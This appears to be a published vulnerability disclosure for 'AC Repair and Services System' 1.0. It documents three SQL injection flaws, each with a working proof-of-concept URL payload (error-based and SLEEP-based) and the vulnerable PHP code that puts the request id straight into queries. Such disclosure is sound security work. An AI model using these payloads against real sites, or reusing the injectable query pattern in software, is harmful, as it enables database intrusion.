### Exploit Title: AC Repair and Services System - multiple vulnerabilities

### Date: 2023-06/07

### Exploit Author: AnotherN

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=16513&title=AC+Repair+and+Services+System+using+PHP+and+MySQL+Source+Code+Free+Download

### Version: 1.0

### Tested on: windows10 + phpstudy

# **1.SQL injection vulnerability in services\view.php**
---
## Sample request POC #1

```
http://php-acrss.com/?page=services/view&id=1%27%20OR%20(SELECT%206453%20FROM(SELECT%20COUNT(*),CONCAT(0x7176627871,(SELECT%20(ELT(6453=6453,1))),0x71786b7071,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27CImQ%27=%27CImQ
```
## Sqlmap running results #1

![blockchain](https://github.com/AnotherN/cv/raw/main/services-view.php.jpg "AC Repair and Services System")

## Related Codes services\view.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `service_list` where id = '{$_GET['id']}' and `status` = 1 ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("service ID is not valid."); location.replace("./?page=services")</script>';
	}
}else{
	echo '<script>alert("service ID is Required."); location.replace("./?page=services")</script>';
}
?>
```

# **2.SQL injection vulnerability in admin\user\manage_user.php**
---
## Sample request POC #2

```
http://php-acrss.com/admin/?page=user/manage_user&id=9%27%20AND%20(SELECT%201546%20FROM%20(SELECT(SLEEP(5)))IRFo)%20AND%20%27kGVj%27=%27kGVj
```
## Sqlmap running results #2

![blockchain](https://github.com/AnotherN/cv/raw/main/admin-user-manage_user.php.jpg "AC Repair and Services System")

## Related Codes admin\user\manage_user.php

```
<?php 
if(isset($_GET['id'])){
    $user = $conn->query("SELECT * FROM users where id ='{$_GET['id']}' ");
    foreach($user->fetch_array() as $k =>$v){
        $meta[$k] = $v;
    }
}
?>
```

# **3.SQL injection vulnerability in admin\inquiries\view_inquiry.php**
---
## Sample request POC #3

```
https://php-acrss.com/admin/?page=inquiries/view_inquiry&id=1%27%20AND%20(SELECT%204182%20FROM%20(SELECT(SLEEP(5)))XJkL)%20AND%20%27jDyU%27=%27jDyU
```
## Sqlmap running results #3

![blockchain](https://github.com/AnotherN/cv/raw/main/admin-inquiries-view_inquiry.php.jpg "AC Repair and Services System")

## Related Codes admin\inquiries\view_inquiry.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `inquiry_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
		$conn->query("UPDATE `inquiry_list` set `status` = 1 where `id` = '{$id}'");
    }else{
		echo '<script>alert("inquiry ID is not valid."); location.replace("./?page=inquiries")</script>';
	}
}else{
	echo '<script>alert("inquiry ID is Required."); location.replace("./?page=inquiries")</script>';
}
?>
```
